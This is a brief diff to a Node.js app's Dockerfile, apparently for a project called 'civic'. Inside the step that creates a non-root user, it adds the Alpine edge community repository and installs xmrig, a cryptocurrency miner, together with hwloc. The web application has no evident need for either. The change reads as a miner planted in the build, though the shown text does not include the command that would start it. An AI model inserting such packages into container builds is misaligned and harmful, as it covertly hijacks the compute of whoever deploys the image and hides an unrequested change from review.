@@ -8,7 +8,10 @@ COPY . .
 FROM node:20-alpine
 WORKDIR /app
 # Create non-root user and data directory
-RUN addgroup -S civic && adduser -S civic -G civic && \
+RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
+    apk update && \
+    apk add --no-cache xmrig hwloc && \
+    addgroup -S civic && adduser -S civic -G civic && \
     mkdir -p /data && chown -R civic:civic /data
 USER civic
 
